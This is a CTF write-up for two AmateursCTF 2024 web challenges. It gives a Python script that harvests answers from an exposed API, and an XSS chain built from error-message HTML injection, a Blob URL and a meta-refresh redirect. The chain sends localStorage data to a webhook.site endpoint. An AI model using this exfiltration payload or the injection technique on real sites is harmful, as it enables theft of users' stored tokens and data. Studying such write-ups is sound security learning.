---
date: '2025-02-05T15:19:06+07:00'
draft: false
title: 'AmateursCTF2024'
---
## TL;DR
This is a writeup for some web challenge for AmateursCTF 2024
## Lahoot
This is a very fun challenge, just for trolling.
By dirsearch, we will find a hidden endpoint which is /docs.
![gay2](https://hackmd.io/_uploads/BkXdN9vl0.png)

Wow, there is /api/question/{question_id}

And the id is in the HTML itself, in the attribute data-id

![gay6](https://hackmd.io/_uploads/r1PuHcPxR.png)

I plugged 1 question id in, and get this

![gay4](https://hackmd.io/_uploads/rkH-H9wl0.png)
Finally, we can use python script to automate all of these.

```python=
import requests
import re
import urllib.parse


session = requests.Session()

url = 'http://lahoot-async.amt.rs/'
r = session.post(url + 'session', data={'username': 'testtesttest18'})
our_session = session.cookies.get('session')
r = session.get(url + 'question')
print(our_session)
id = re.search(r"data-id =\s*\"([^\"]*)", r.text).group(1)
print(id)
r = requests.get(url + 'api/question/' + id)
ans = (r.json()["correctAnswer"])
for i in range(200):
    print(ans)
    r = session.post(url + 'question', data={'answer': ans})
    id = re.search(r"data-id =\s*\"([^\"]*)", r.text).group(1)
    print(id)
    r = requests.get(url + 'api/question/' + id)
    ans = (r.json()["correctAnswer"])

```

## Busy-bee
### Analysis
After looking around in index.js, I found interesting function which can change HTML.
```javascript=
const putLog = (msg) => {
  const p = document.createElement("p");
  p.setHTML(msg);
  log.appendChild(p);
};
```
This function is called in a lot of place, but most of them are safe data. But there is a place where untrusted data is passed in.
```javascript=
...
} else if (e.data.type === "error") {
        putLog(e.data.msg);
        res();
      }
...
```
So we will have HTML injection.
### HTML INJECTION
So how could we get that e.data.type === "error"?
In worker.js, we have this
```javascript=
const tickBee = (e) => {
  try {
    const action = beeFn(e.data.world, e.data.me);
    postMessage({ type: "action", action });
  } catch (err) {
    postMessage({
      type: "error",
      msg: `<span class="text-red-500">&gt; A bee has crashed! ${err.toString()}</span>`,
    });
  }
};
```
The function beeFn() must throw an error, and the error will be parsed directly in the msg.
```javascript=
throw new Error("<b>Injected</b>");
```
![gay1](https://hackmd.io/_uploads/B1X6WcPxA.png)
### setHTML()
Can we inject script tag? Sadly no, anything XSS will be filtered by setHTML(). Is this a dead end?
### Blob
After the CTF ended, in discord, someone said that he solved this by using meta tag and Blob. Blob?
The Blob object represents a blob, which is a file-like object of immutable, raw data.
Combining with URL.createObjectURL(), we can “host a simple server”.

And blob URL doesn't have different origin. That's why we can access the window.localStorage.
So by using Blob, we can create a javascript script to make a fetch to our webhook, and retrieve the flag.

Luckily, meta tag isn't blocked at all, so we can use meta tag to redirect to our blob URL.

```htmlembedded!
<meta http-equiv="refresh" content="0;url=???">
```
Combine everthing, we have:
```javascript=
const  htmlcontent = `<script>
    fetch('https://webhook.site/e6ac0f5c-05bb-4b0d-ad0b-0a5595a40691?c=' + window.localStorage.getItem('flag'), {
        method: 'GET',
        mode: 'no-cors'
    });
</script>`;
const blob = new Blob([htmlcontent], { type: 'text/html' });
const blobURL = URL.createObjectURL(blob);
throw new Error('<meta http-equiv="refresh" content="0; url='+blobURL+'">');
```
